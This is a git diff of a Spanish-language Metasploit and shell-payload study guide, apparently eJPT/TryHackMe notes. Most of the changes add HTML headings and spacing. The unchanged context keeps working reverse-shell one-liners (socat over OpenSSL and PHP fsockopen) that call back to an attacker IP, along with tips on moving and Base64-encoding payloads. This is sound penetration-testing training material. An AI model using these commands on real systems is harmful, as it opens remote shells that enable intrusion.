@@ -1,9 +1,11 @@
-# 🛡️ GUÍA COMPLETA DE METASPLOIT, SHELLS, OYENTES Y GENERACIÓN DE PAYLOADS
-### *Manual Extensivo y Guía de Referencia Técnica – Certificación eJPT*
+<h1>
+  <img src="https://cdn-images.tryhackme.com/modules/metasploit-and-exploitation-1779465728622.svg" width="70px" align="absmiddle">
+  <span> METASPLOIT AND EXPLOITATION</span>
+</h1>
 
 ---
 
-> **Estructura del Manual:** Organizado exactamente en orden cronológico según las 6 fuentes de Notion seleccionadas. Cada sección principal corresponde a un módulo y contiene explicaciones conceptuales exhaustivas, arquitecturas, comandos, banderas, desgloses paso a paso, ejemplos prácticos, técnicas de evasión y métodos de estabilización. La redacción es fluida y narrativa en texto corrido, sin viñetas fuera de bloques de código o tablas, ideal para consultar durante exámenes y auditorías de seguridad.
+> Este módulo cubre la explotación desde dos ángulos complementarios: Metasploit, el marco que impulsa innumerables compromisos del mundo real, y el manual que lo sustenta. Trabajarás a través de Metasploit desde cero, aprendiendo a escanear vulnerabilidades, explotar sistemas en vivo, ejecutar módulos posteriores a la explotación y generar cargas útiles personalizadas con msfvenom. A partir de ahí, te moverás más allá del marco para construir tus propios proyectiles, oyentes y cargas útiles desde cero, para que puedas armar un exploit ya sea que un marco esté sobre la mesa o no.
 
 ---
 
@@ -28,7 +30,12 @@
 
 ---
 
-## 1. Metasploit: Los Fundamentos (Metasploit: The Basics)
+<br>
+
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/5f04259cf9bf5b57aed2c476-1778591811135" width="60px" align="absmiddle">
+  <span> Metasploit: Los Fundamentos (Metasploit: The Basics)</span>
+</h2>
 
 ### 1.1. Introducción al Metasploit Framework
 El Metasploit Framework representa el entorno de explotación de código abierto más utilizado en la industria de la ciberseguridad y las pruebas de penetración. Creado originalmente por H. D. Moore en el año 2003 como una herramienta portátil en Perl y posteriormente reescrito en Ruby, el proyecto fue adquirido por Rapid7 en 2009. Desde entonces, ha evolucionado hasta convertirse en un ecosistema masivo que alberga miles de módulos de explotación, escáneres auxiliares, cargas útiles y herramientas de post-explotación.
@@ -43,6 +50,8 @@ El marco se sostiene conceptualmente sobre tres pilares fundamentales:
 `msfconsole`: Es la interfaz de línea de comandos central desde la cual se gestionan todas las operaciones. Funciona como la cabina de mando desde la que se buscan módulos, se configuran parámetros, se ejecutan ataques y se administran las sesiones activas.
 `Módulos`: Son los bloques de construcción individuales del marco. Cada módulo es un archivo de código independiente diseñado para realizar una tarea específica, ya sea escanear un puerto, explotar un fallo o volcar contraseñas de la memoria.
 `Herramientas independendientes`: Son utilidades complementarias que se ejecutan fuera de la consola principal. La más destacada es `msfvenom`, utilizada para la generación independiente de cargas útiles ejecutables, web shells o código de shell sin procesar.
+
+<br>
 
 ### 1.2. Conceptos Clave y la Cadena de Explotación
 Dentro del ámbito de la seguridad informática existen tres términos que se utilizan constantemente y cuya distinción precisa es indispensable para cualquier auditor:
@@ -67,6 +76,8 @@ Dentro de la categoría de cargas útiles, Metasploit distingue tres tipos segú
 `Stages`: Son los bloques de código más grandes y complejos (como la carga útil completa de Meterpreter) que el stager descarga e inyecta directamente en la memoria RAM del objetivo.
 
 La convención de nomenclatura de Metasploit permite identificar de inmediato si una carga útil es sin etapas o por etapas analizando la sintaxis del nombre. Si el tipo de shell y el método de conexión están separados por un guión bajo (`_`), como en `windows/x64/shell_reverse_tcp`, se trata de una carga útil **sin etapas (singles/inline)**. Si están separados por una barra diagonal (`/`), como en `windows/x64/shell/reverse_tcp`, se trata de una carga útil **por etapas (staged)**.
+
+<br>
 
 ### 1.3. Navegación por Msfconsole
 La consola interactiva `msfconsole` se inicia ejecutando el comando `msfconsole` en la terminal de Linux. Tras unos segundos de carga, la interfaz presenta un banner en arte ASCII junto con el recuento actualizado de módulos disponibles y cambia el indicador de la consola a `msf6 >`.
@@ -158,9 +169,16 @@ Oyente en la máquina atacante:
 Cliente en la víctima Linux:
 `/tmp/socat OPENSSL:10.10.14.12:443,verify=0 EXEC:"bash -li",pty,stderr,setsid,sigint,sane`
 
+<br>
+
 ---
 
-## 6. Generación y Entrega de Payloads de Shell (Shell Payload Generation & Delivery)
+<br>
+
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/6989b1062386d3517f652edd-1778494472489" width="60px" align="absmiddle">
+  <span> Generación y Entrega de Payloads de Shell (Shell Payload Generation & Delivery)</span>
+</h2>
 
 ### 6.1. Cargas Útiles Comunes de Shell
 Dependiendo de las tecnologías presentes en el servidor víctima, existen diferentes payloads y scripts estándar para desencadenar una reverse shell:
@@ -176,6 +194,8 @@ Dependiendo de las tecnologías presentes en el servidor víctima, existen difer
 
 **PHP Reverse Shell:**
 `php -r '$sock=fsockopen("10.10.14.12",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+
+<br>
 
 ### 6.2. Estrategias de Transferencia y Entrega
 Una vez generada la carga útil en la máquina atacante (ya sea un binario ELF, un ejecutable EXE o una web shell PHP), se deben emplear canales de transferencia eficientes para depositar el archivo en el objetivo:
@@ -196,6 +216,8 @@ En la víctima Windows se recurre a PowerShell o `certutil`:
 
 **Transferencia mediante Codificación Base64:**
 Cuando los canales de red directa están bloqueados o existen filtros de caracteres en la entrada, se puede codificar la carga útil en Base64 en la máquina atacante (`cat payload.exe | base64 -w 0`) y decodificarla directamente en la víctima en memoria o disco (`echo 'CADENA_BASE64' | base64 -d > /tmp/payload.elf`).
+
+<br>
 
 ### 6.3. Automatización del Flujo de Explotación
 Un proceso de explotación profesional debe seguir un flujo coordinado sin fisuras para evitar la pérdida de accesos iniciales:
